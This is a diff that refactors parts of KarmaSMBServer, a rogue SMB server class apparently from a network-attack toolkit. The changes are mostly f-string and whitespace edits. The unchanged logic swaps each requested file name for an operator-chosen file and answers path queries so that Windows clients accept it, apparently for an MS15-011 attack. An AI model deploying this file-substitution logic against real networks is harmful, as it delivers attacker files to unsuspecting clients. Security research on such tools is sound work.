@@ -207,7 +207,7 @@ class KarmaSMBServer(Thread):
                     searchCount +=1
                     respData += data
                     totalData += lenData
-                    
+
 
             respParameters['SID'] = sid
             respParameters['EndOfSearch'] = endOfSearch
@@ -263,11 +263,15 @@ class KarmaSMBServer(Thread):
             targetFile = self.extensions[origPathNameExtension.upper()]
         else:
             targetFile = self.defaultFile
-        
+
         # 2. We change the filename in the request for our targetFile
         ntCreateAndXData['FileName'] = encodeSMBString( flags = recvPacket['Flags2'], text = targetFile)
         SMBCommand['Data'] = ntCreateAndXData.getData()
-        smbServer.log("%s is asking for %s. Delivering %s" % (connData['ClientIP'], origPathName,targetFile),logging.INFO)
+        smbServer.log(
+            f"{connData['ClientIP']} is asking for {origPathName}. Delivering {targetFile}",
+            logging.INFO,
+        )
+
 
         # 3. We call the original call with our modified data
         return self.origsmbComNtCreateAndX(connId, smbServer, SMBCommand, recvPacket)
@@ -276,7 +280,7 @@ class KarmaSMBServer(Thread):
         # The trick we play here is that Windows clients first ask for the file
         # and then it asks for the directory containing the file.
         # It is important to answer the right questions for the attack to work
-        
+
         connData = smbServer.getConnectionData(connId)
 
         respSetup = b''
@@ -289,31 +293,35 @@ class KarmaSMBServer(Thread):
         if recvPacket['Tid'] in connData['ConnectedShares']:
             path = ''
             try:
-               origPathName = decodeSMBString(recvPacket['Flags2'], queryPathInfoParameters['FileName'])
-               origPathName = os.path.normpath(origPathName.replace('\\','/'))
+                origPathName = decodeSMBString(recvPacket['Flags2'], queryPathInfoParameters['FileName'])
+                origPathName = os.path.normpath(origPathName.replace('\\','/'))
 
-               if ('MS15011' in connData) is False:
-                   connData['MS15011'] = {}
+                if 'MS15011' not in connData:
+                    connData['MS15011'] = {}
 
-               smbServer.log("Client is asking for QueryPathInformation for: %s" % origPathName,logging.INFO)
-               if origPathName in connData['MS15011'] or origPathName == '.':
-                   # We already processed this entry, now it's asking for a directory
-                   infoRecord, errorCode = queryPathInformation(path, '/', queryPathInfoParameters['InformationLevel'])
-               else:
-                   # First time asked, asking for the file
-                   infoRecord, errorCode = queryPathInformation(path, self.defaultFile, queryPathInfoParameters['InformationLevel'])
-                   connData['MS15011'][os.path.dirname(origPathName)] = infoRecord
+                smbServer.log(
+                    f"Client is asking for QueryPathInformation for: {origPathName}",
+                    logging.INFO,
+                )
+
+                if origPathName in connData['MS15011'] or origPathName == '.':
+                    # We already processed this entry, now it's asking for a directory
+                    infoRecord, errorCode = queryPathInformation(path, '/', queryPathInfoParameters['InformationLevel'])
+                else:
+                    # First time asked, asking for the file
+                    infoRecord, errorCode = queryPathInformation(path, self.defaultFile, queryPathInfoParameters['InformationLevel'])
+                    connData['MS15011'][os.path.dirname(origPathName)] = infoRecord
             except Exception as e:
-               #import traceback
-               #traceback.print_exc()
-               smbServer.log("queryPathInformation: %s" % e,logging.ERROR)
+                           #import traceback
+                           #traceback.print_exc()
+                smbServer.log(f"queryPathInformation: {e}", logging.ERROR)
 
             if infoRecord is not None:
                 respParameters = smb.SMBQueryPathInformationResponse_Parameters()
                 respData = infoRecord
         else:
             errorCode = STATUS_SMB_BAD_TID
-           
+
         smbServer.setConnectionData(connId, connData)
 
         return respSetup, respParameters, respData, errorCode
@@ -374,10 +382,14 @@ class KarmaSMBServer(Thread):
             else:
                 targetFile = self.defaultFile
             connData['MS15011']['FileData'] = (os.path.basename(origPathName), targetFile)
-            smbServer.log("%s is asking for %s. Delivering %s" % (connData['ClientIP'], origPathName,targetFile),logging.INFO)
+            smbServer.log(
+                f"{connData['ClientIP']} is asking for {origPathName}. Delivering {targetFile}",
+                logging.INFO,
+            )
+
         else:
             targetFile = '/'
-        
+
         # 2. We change the filename in the request for our targetFile
         try:
             ntCreateRequest['Buffer'] = targetFile.encode('utf-16le')
@@ -407,7 +419,7 @@ class KarmaSMBServer(Thread):
         #    return [smb2.SMB2Error()], None, STATUS_NOT_SUPPORTED
 
         if connData['MS15011']['FindDone'] is True:
-            
+
             connData['MS15011']['FindDone'] = False
             smbServer.setConnectionData(connId, connData)
             return [smb2.SMB2Error()], None, STATUS_NO_MORE_FILES 
@@ -469,10 +481,8 @@ class KarmaSMBServer(Thread):
             path = ntpath.basename(UNCOrShare)
 
         # We won't search for the share.. all of them exist :P
-        #share = searchShare(connId, path.upper(), smbServer) 
-        connData['MS15011'] = {}
-        connData['MS15011']['FindDone'] = False
-        connData['MS15011']['StopConnection'] = False
+        #share = searchShare(connId, path.upper(), smbServer)
+        connData['MS15011'] = {'FindDone': False, 'StopConnection': False}
         share = {}
         if share is not None:
             # Simple way to generate a Tid
@@ -486,7 +496,7 @@ class KarmaSMBServer(Thread):
             respPacket['TreeID']    = tid
             #smbServer.log("Connecting Share(%d:%s)" % (tid,path))
         else:
-            smbServer.log("SMB2_TREE_CONNECT not found %s" % path, logging.ERROR)
+            smbServer.log(f"SMB2_TREE_CONNECT not found {path}", logging.ERROR)
             errorCode = STATUS_OBJECT_PATH_NOT_FOUND
             respPacket['Status'] = errorCode
         ##
